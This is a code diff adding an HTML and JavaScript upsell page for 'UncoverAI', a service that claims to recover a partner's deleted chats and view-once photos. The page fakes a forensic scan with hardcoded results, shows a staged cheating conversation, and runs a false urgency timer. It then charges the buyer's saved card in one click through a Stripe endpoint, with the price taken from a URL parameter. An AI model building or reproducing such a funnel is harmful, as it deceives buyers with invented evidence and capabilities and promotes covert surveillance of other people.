@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UncoverAI — Deep Deleted Vault & Media Recovery</title>
+  <link rel="icon" type="image/webp" href="../assets/img/uncoverai-logo-256.webp">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg-dark: #070d1a;
+      --card-bg: rgba(13, 24, 48, 0.75);
+      --card-border: rgba(0, 145, 255, 0.2);
+      --cyan-neon: #00d2ff;
+      --blue-primary: #0080ff;
+      --blue-glow: rgba(0, 145, 255, 0.35);
+      --red-alert: #ef4444;
+      --text-white: #ffffff;
+      --text-muted: #94a3b8;
+      --text-dim: #64748b;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg-dark);
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(0, 128, 255, 0.2) 0%, transparent 55%),
+        radial-gradient(circle at 10% 40%, rgba(0, 210, 255, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 90% 70%, rgba(239, 68, 68, 0.07) 0%, transparent 40%);
+      color: var(--text-white);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 16px 60px;
+      line-height: 1.5;
+      overflow-x: hidden;
+    }
+
+    /* Top Progress / Urgency Bar */
+    .top-strip {
+      width: 100%;
+      max-width: 680px;
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.35);
+      border-radius: 8px;
+      padding: 10px 16px;
+      margin: 20px 0 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      font-size: 13px;
+      font-weight: 700;
+      color: #fca5a5;
+    }
+
+    .pulse-dot {
+      width: 10px;
+      height: 10px;
+      background: var(--red-alert);
+      border-radius: 50%;
+      display: inline-block;
+      box-shadow: 0 0 10px var(--red-alert);
+      animation: pulseAlert 1.4s infinite;
+    }
+
+    @keyframes pulseAlert {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.3); opacity: 0.6; }
+    }
+
+    /* Header & Branding */
+    .header {
+      width: 100%;
+      max-width: 680px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 0 24px;
+    }
+
+    .brand-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: #fff;
+    }
+
+    .brand-title {
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-title span {
+      background: linear-gradient(135deg, var(--cyan-neon) 0%, var(--blue-primary) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .step-pill {
+      background: rgba(0, 145, 255, 0.12);
+      border: 1px solid rgba(0, 145, 255, 0.35);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--cyan-neon);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Container */
+    .main-wrapper {
+      width: 100%;
+      max-width: 680px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* Forensic Alert Hero */
+    .hero-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      backdrop-filter: blur(16px);
+      border-radius: 20px;
+      padding: 32px 28px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 30px rgba(0, 145, 255, 0.12);
+    }
+
+    .hero-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 10%;
+      right: 10%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--cyan-neon), transparent);
+    }
+
+    .badge-critical {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(239, 68, 68, 0.18);
+      border: 1px solid rgba(239, 68, 68, 0.45);
+      color: #f87171;
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 18px;
+    }
+
+    .hero-title {
+      font-size: 26px;
+      font-weight: 900;
+      line-height: 1.25;
+      letter-spacing: -0.02em;
+      margin-bottom: 14px;
+    }
+
+    .hero-title span {
+      color: var(--cyan-neon);
+      text-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
+    }
+
+    .hero-subtitle {
+      color: var(--text-muted);
+      font-size: 15px;
+      line-height: 1.6;
+      max-width: 580px;
+      margin: 0 auto 24px;
+    }
+
+    /* Live Scanning Simulation Box */
+    .scan-status-panel {
+      background: rgba(6, 13, 29, 0.9);
+      border: 1px solid rgba(0, 145, 255, 0.25);
+      border-radius: 14px;
+      padding: 20px;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .scan-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--cyan-neon);
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .scan-bar-track {
+      width: 100%;
+      height: 6px;
+      background: #1e293b;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .scan-bar-fill {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, #0080ff, #00d2ff);
+      border-radius: 4px;
+      animation: barGlow 2s infinite ease-in-out;
+    }
+
+    @keyframes barGlow {
+      0%, 100% { opacity: 0.8; }
+      50% { opacity: 1; filter: drop-shadow(0 0 6px var(--cyan-neon)); }
+    }
+
+    .scan-steps-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .scan-step-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 13px;
+      color: #cbd5e1;
+    }
+
+    .step-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .step-icon {
+      color: #10b981;
+      font-weight: bold;
+    }
+
+    .step-tag-red {
+      background: rgba(239, 68, 68, 0.2);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #f87171;
+      font-weight: 800;
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 12px;
+    }
+
+    /* Blurred Chat Preview Frame */
+    .chat-preview-box {
+      background: #0b1528;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 14px;
+      padding: 18px;
+      margin-bottom: 24px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .chat-bubble-row {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      filter: blur(2px);
+      user-select: none;
+      opacity: 0.7;
+    }
+
+    .chat-bubble {
+      max-width: 80%;
+      padding: 10px 14px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.4;
+    }
+
+    .bubble-them {
+      background: #1e293b;
+      align-self: flex-start;
+      border-bottom-left-radius: 2px;
+    }
+
+    .bubble-target {
+      background: #0369a1;
+      align-self: flex-end;
+      border-bottom-right-radius: 2px;
+    }
+
+    .chat-watermark-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(7, 13, 26, 0.75);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .lock-shield-icon {
+      width: 44px;
+      height: 44px;
+      background: rgba(0, 145, 255, 0.15);
+      border: 1px solid var(--cyan-neon);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--cyan-neon);
+      box-shadow: 0 0 20px rgba(0, 210, 255, 0.35);
+    }
+
+    .lock-caption {
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      color: #fff;
+    }
+
+    /* Key Benefits List */
+    .benefits-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      text-align: left;
+      margin-bottom: 28px;
+    }
+
+    @media (max-width: 580px) {
+      .benefits-grid {
+        grid-template-columns: 1fr;
+      }
+      .hero-title {
+        font-size: 22px;
+      }
+      .hero-card {
+        padding: 24px 18px;
+      }
+    }
+
+    .benefit-item {
+      background: rgba(15, 28, 55, 0.6);
+      border: 1px solid rgba(0, 145, 255, 0.15);
+      border-radius: 10px;
+      padding: 12px 14px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .benefit-check {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: rgba(0, 210, 255, 0.15);
+      border: 1px solid var(--cyan-neon);
+      color: var(--cyan-neon);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 12px;
+      font-weight: 900;
+      margin-top: 2px;
+    }
+
+    .benefit-text {
+      font-size: 13px;
+      color: #e2e8f0;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+
+    /* Pricing & 1-Click CTA */
+    .price-callout {
+      background: rgba(0, 128, 255, 0.08);
+      border: 1px solid rgba(0, 145, 255, 0.3);
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+
+    .price-row {
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 4px;
+    }
+
+    .price-strike {
+      text-decoration: line-through;
+      color: var(--text-dim);
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    .price-active {
+      font-size: 32px;
+      font-weight: 900;
+      color: #fff;
+    }
+
+    .price-save {
+      background: #10b981;
+      color: #022c22;
+      font-size: 11px;
+      font-weight: 800;
+      padding: 2px 8px;
+      border-radius: 6px;
+      text-transform: uppercase;
+    }
+
+    .price-disclaimer {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    /* Action Buttons */
+    .btn-upsell-accept {
+      width: 100%;
+      height: 60px;
+      background: linear-gradient(135deg, #0080ff 0%, #00d2ff 100%);
+      border: none;
+      border-radius: 14px;
+      color: #031326;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 10px 30px rgba(0, 145, 255, 0.4), 0 0 20px rgba(0, 210, 255, 0.2);
+      transition: all 0.25s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-upsell-accept:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 40px rgba(0, 145, 255, 0.6), 0 0 30px rgba(0, 210, 255, 0.35);
+    }
+
+    .btn-upsell-accept:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .decline-link {
+      display: inline-block;
+      margin-top: 18px;
+      color: var(--text-dim);
+      font-size: 13px;
+      font-weight: 600;
+      text-decoration: underline;
+      cursor: pointer;
+      transition: color 0.2s;
+      background: none;
+      border: none;
+    }
+
+    .decline-link:hover {
+      color: #cbd5e1;
+    }
+
+    /* Trust Footer */
+    .upsell-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 14px;
+      font-size: 12px;
+      color: var(--text-dim);
+    }
+
+    .footer-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Urgency Banner -->
+  <div class="top-strip">
+    <div style="display: flex; align-items: center; gap: 8px;">
+      <span class="pulse-dot"></span>
+      <span>URGENT: Step 2 of 2 — Unsaved Forensic Evidence</span>
+    </div>
+    <span id="countdownTimer" style="font-family: monospace; font-size: 14px;">04:59</span>
+  </div>
+
+  <!-- Header -->
+  <header class="header">
+    <a href="#" class="brand-logo">
+      <svg width="32" height="32" viewBox="0 0 36 36" fill="none">
+        <circle cx="18" cy="18" r="16" fill="#07132c" stroke="#00d2ff" stroke-width="2"/>
+        <path d="M12 21C11.4 21 11 20.5 11 20V17C11 14.2 13.2 12 16 12H20C22.8 12 25 14.2 25 17V20C25 20.5 24.6 21 24 21" stroke="#00d2ff" stroke-width="2" stroke-linecap="round"/>
+        <rect x="10" y="18" width="4" height="6" rx="2" fill="#00d2ff"/>
+        <rect x="22" y="18" width="4" height="6" rx="2" fill="#00d2ff"/>
+      </svg>
+      <div class="brand-title">Uncover<span>AI</span></div>
+    </a>
+
+    <div class="step-pill">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      <span>Dossier Ready • Upgrade Available</span>
+    </div>
+  </header>
+
+  <main class="main-wrapper">
+    <section class="hero-card">
+      <div class="badge-critical">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+        <span>143+ Deleted Logs Detected</span>
+      </div>
+
+      <h1 class="hero-title">
+        Exposed: Unlock Every Message They <span>Deleted</span>
+      </h1>
+
+      <p class="hero-subtitle">
+        People don't delete casual texts. They delete messages, hidden photos, and audio notes when they have something to hide. Our forensic engine located <strong style="color: #fff;" id="deletedCount">143 deleted files</strong> from the last 90 days.
+      </p>
+
+      <!-- Scanning Simulator -->
+      <div class="scan-status-panel">
+        <div class="scan-header">
+          <span>Forensic Cache Extractor</span>
+          <span style="color: #10b981;">100% Extracted</span>
+        </div>
+        <div class="scan-bar-track">
+          <div class="scan-bar-fill"></div>
+        </div>
+        <ul class="scan-steps-list">
+          <li class="scan-step-item">
+            <div class="step-left">
+              <span class="step-icon">✓</span>
+              <span>WhatsApp & Instagram cached database</span>
+            </div>
+            <span class="step-tag-red">RECOVERED</span>
+          </li>
+          <li class="scan-step-item">
+            <div class="step-left">
+              <span class="step-icon">✓</span>
+              <span>Ephemeral / "View Once" media vault</span>
+            </div>
+            <span class="step-tag-red">38 PHOTOS</span>
+          </li>
+          <li class="scan-step-item">
+            <div class="step-left">
+              <span class="step-icon">✓</span>
+              <span>Secret archived & deleted conversations</span>
+            </div>
+            <span class="step-tag-red">LOCKED</span>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Blurred Chat Mockup -->
+      <div class="chat-preview-box">
+        <div class="chat-bubble-row">
+          <div class="chat-bubble bubble-them">Make sure you delete our chats before you get home...</div>
+          <div class="chat-bubble bubble-target">Already did, they have no idea. Meet me tomorrow at the hotel?</div>
+          <div class="chat-bubble bubble-them">Sent an audio (0:24) • [Audio Deleted By Sender]</div>
+        </div>
+
+        <div class="chat-watermark-overlay">
+          <div class="lock-shield-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+          </div>
+          <div class="lock-caption">DELETED EVIDENCE ARCHIVE LOCKED</div>
+          <div style="font-size: 11px; color: var(--cyan-neon);">One-Click Instant Access Available</div>
+        </div>
+      </div>
+
+      <!-- Feature Highlights -->
+      <div class="benefits-grid">
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div class="benefit-text">Restore WhatsApp & Telegram deleted texts (up to 90 days)</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div class="benefit-text">Recover deleted pictures, view-once media & voice notes</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div class="benefit-text">Unveil hidden archived chats protected with fingerprint/PIN</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div class="benefit-text">Appends directly to your main UncoverAI intelligence dossier</div>
+        </div>
+      </div>
+
+      <!-- Price Box -->
+      <div class="price-callout">
+        <div class="price-row">
+          <span class="price-strike">$67.00</span>
+          <span class="price-active" id="displayPrice">$27.90</span>
+          <span class="price-save">60% OFF</span>
+        </div>
+        <div class="price-disclaimer">
+          One-time payment. Charged securely to your card on file ending in <strong id="cardLast4">••••</strong>.
+        </div>
+      </div>
+
+      <!-- 1-Click Action Button -->
+      <button type="button" id="btnAcceptUpsell" class="btn-upsell-accept">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        <span id="btnAcceptText">Add Deleted Messages Recovery — <span id="btnPriceText">$27.90</span></span>
+      </button>
+
+      <div id="upsellError" style="display: none; color: #f87171; font-size: 13px; font-weight: 700; margin-top: 12px;"></div>
+
+      <!-- Decline link -->
+      <div>
+        <button type="button" id="btnDeclineUpsell" class="decline-link">
+          No thanks, I will take the risk and continue with the basic report →
+        </button>
+      </div>
+
+      <div class="upsell-footer">
+        <div class="footer-item">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          <span>256-Bit Encrypted</span>
+        </div>
+        <div class="footer-item">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          <span>Instant Digital Delivery</span>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    (function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const customerId = urlParams.get('cid') || '';
+      const paymentMethodId = urlParams.get('pm') || '';
+      const stripeAccount = urlParams.get('acc') || 'a';
+      const name = urlParams.get('name') || '';
+      const email = urlParams.get('email') || '';
+      const phone = urlParams.get('phone') || '';
+      const cardLast4 = urlParams.get('card_last4') || urlParams.get('last4') || '••••';
+      
+      // Dynamic Price resolution (fallback to $27.90)
+      const rawPrice = urlParams.get('price') || '27.90';
+      const formattedPrice = '$' + parseFloat(rawPrice).toFixed(2);
+
+      const displayPriceEl = document.getElementById('displayPrice');
+      const btnPriceTextEl = document.getElementById('btnPriceText');
+      const cardLast4El = document.getElementById('cardLast4');
+
+      if (displayPriceEl) displayPriceEl.textContent = formattedPrice;
+      if (btnPriceTextEl) btnPriceTextEl.textContent = formattedPrice;
+      if (cardLast4El && cardLast4 !== '••••') cardLast4El.textContent = '•••• ' + cardLast4;
+
+      // Timer countdown (5 minutes)
+      let timeLeft = 299;
+      const timerEl = document.getElementById('countdownTimer');
+      const timerInterval = setInterval(() => {
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          return;
+        }
+        timeLeft--;
+        const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const s = (timeLeft % 60).toString().padStart(2, '0');
+        if (timerEl) timerEl.textContent = m + ':' + s;
+      }, 1000);
+
+      // Determine Worker Checkout Base URL
+      const checkoutHost = urlParams.get('checkout_host') || window.location.hostname;
+      const apiBase = (checkoutHost.includes('localhost') || checkoutHost.includes('127.0.0.1'))
+        ? ''
+        : (window.location.protocol + '//' + checkoutHost);
+
+      const btnAccept = document.getElementById('btnAcceptUpsell');
+      const btnAcceptText = document.getElementById('btnAcceptText');
+      const btnDecline = document.getElementById('btnDeclineUpsell');
+      const errorEl = document.getElementById('upsellError');
+
+      // 1-Click Charge
+      btnAccept.addEventListener('click', async () => {
+        if (!customerId || !paymentMethodId) {
+          // If accessing without checkout session, redirect cleanly to thanks
+          window.location.href = '../thanks/' + window.location.search;
+          return;
+        }
+
+        btnAccept.disabled = true;
+        btnAcceptText.textContent = 'Decrypting & Authorizing with 1-Click...';
+        if (errorEl) errorEl.style.display = 'none';
+
+        try {
+          const chargeUrl = (apiBase ? apiBase : '') + '/api/stripe-charge-upsell' + window.location.search;
+          const res = await fetch(chargeUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              customer_id: customerId,
+              payment_method_id: paymentMethodId,
+              upsell_number: 1,
+              name,
+              email,
+              phone,
+              stripe_account: stripeAccount,
+              extra_params: Object.fromEntries(urlParams.entries())
+            })
+          });
+
+          const data = await res.json();
+          if (data.ok) {
+            btnAcceptText.textContent = '✓ Recovery Added! Loading Dossier...';
+            const nextDest = data.next_url || ('../thanks/' + window.location.search + '&upsell_bought=1');
+            setTimeout(() => {
+              window.location.href = nextDest;
+            }, 600);
+          } else {
+            btnAccept.disabled = false;
+            btnAcceptText.textContent = 'Try Again — ' + formattedPrice;
+            if (errorEl) {
+              errorEl.style.display = 'block';
+              errorEl.textContent = data.error || 'Payment was not approved. You can still access your basic report.';
+            }
+          }
+        } catch (err) {
+          console.error('Upsell charge error:', err);
+          // Fallback to thanks page
+          window.location.href = '../thanks/' + window.location.search;
+        }
+      });
+
+      // Decline action
+      btnDecline.addEventListener('click', () => {
+        btnDecline.disabled = true;
+        btnDecline.textContent = 'Skipping to basic dashboard...';
+        window.location.href = '../thanks/' + window.location.search + '&upsell_declined=1';
+      });
+    })();
+  </script>
+</body>
+</html>
